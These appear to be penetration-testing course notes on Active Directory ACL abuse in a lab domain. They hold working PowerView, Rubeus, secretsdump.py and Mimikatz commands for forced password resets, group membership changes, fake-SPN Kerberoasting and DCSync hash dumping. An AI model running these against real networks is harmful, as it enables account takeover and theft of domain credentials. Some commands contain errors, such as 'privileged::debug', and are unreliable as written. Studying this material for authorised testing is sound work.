## Access Control Entries (ACEs)

There are `three` main types of ACEs that can be applied to all securable objects in AD:

|**ACE**|**Description**|
|---|---|
|`Access denied ACE`|Used within a DACL to show that a user or group is explicitly denied access to an object|
|`Access allowed ACE`|Used within a DACL to show that a user or group is explicitly granted access to an object|
|`System audit ACE`|Used within a SACL to generate audit logs when a user or group attempts to access an object. It records whether access was granted or not and what type of access occurred|
Each ACE is made up of the following `four` components:

1. The security identifier (SID) of the user/group that has access to the object (or principal name graphically)
2. A flag denoting the type of ACE (access denied, allowed, or system audit ACE)
3. A set of flags that specify whether or not child containers/objects can inherit the given ACE entry from the primary or parent object
4. An [access mask](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/7a53f60e-e730-4dfe-bbe9-b21b62eb790b?redirectedfrom=MSDN) which is a 32-bit value that defines the rights granted to an object
## Why are ACEs Important?

- `ForceChangePassword` abused with `Set-DomainUserPassword`
- `Add Members` abused with `Add-DomainGroupMember`
- `GenericAll` abused with `Set-DomainUserPassword` or `Add-DomainGroupMember`
- `GenericWrite` abused with `Set-DomainObject`
- `WriteOwner` abused with `Set-DomainObjectOwner`
- `WriteDACL` abused with `Add-DomainObjectACL`
- `AllExtendedRights` abused with `Set-DomainUserPassword` or `Add-DomainGroupMember`
- `AddSelf` abused with `Add-DomainGroupMember`

![[ACE Attacks.png]]

# ACL Enumeration
## Enumerating ACLs with PowerView
#### Using Find-InterestingDomainAcl

```powershell
Find-InterestingDomainAcl
```

The results of this query will be too large to check. We can specify a target instead

```powershell
$sid = Convert-NameToSid wley
```
#### Using Get-DomainObjectACL

```powershell
Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```
#### Performing a Reverse Search & Mapping to a GUID Value

```powershell
$guid= "00299570-246d-11d0-a768-00aa006e0529"

Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl
```
#### Using the -ResolveGUIDs Flag

```powershell
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```
#### Investigating the Information Technology Group

```powershell
$itgroupsid = Convert-NameToSid "Information Technology"

Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose
```
#### Looking for Interesting Access

```powershell
$adunnsid = Convert-NameToSid adunn

Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $adunnsid} -Verbose
```

# ACL Abuse Tactics

## Abusing ACLs
### Abusing Force Change Password

```powershell
$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)

$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force

Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
```

### Abusing GenericWrite on a Group

```powershell
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
```

### Targeted Kerberoasting

We can create a **Fake SPN**

```powershell
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```

Now we can kerberoast the user with `Rubeus`

```powershell
.\Rubeus.exe kerberoast /user:adunn /nowrap
```

Now we can obtain the hash of the user and try to crack it offline.

---

# DCSync

## What is DCSync and how does it work?

It's a technique used for stealing the AD password database by using the built-in **Directory Replication Service Remote Protocol**. 

It's done by using the `DS-Replication-Get-Changes-All` extended right. To perform the attack, we must have a control over an account that has the (Replicating Directory Changes and Replicating Directory Changes All) permissions.
#### Extracting NTLM Hashes and Kerberos Keys Using secretsdump.py

```sh
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
```

- `-just-dc-ntlm` can be used if we only wants NTLM
- `-just-dc-user <USERNAME>` to only extract data for a specific user
- `-pwd-last-set` to see when each account's password was last changed
- `history` if we want to dump password history
- `-user-status` to see if a user is disabled
#### Viewing an Account with Reversible Encryption Password Storage Set

![[Reversible Encryption.png]]
#### Enumerating Further using Get-ADUser

```powershell
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
```
#### Checking for Reversible Encryption Option using Get-DomainUser

```powershell
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```
#### Performing DCSync with Mimikatz

```powershell
mimikatz.exe "privileged::debug" "lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator"
```
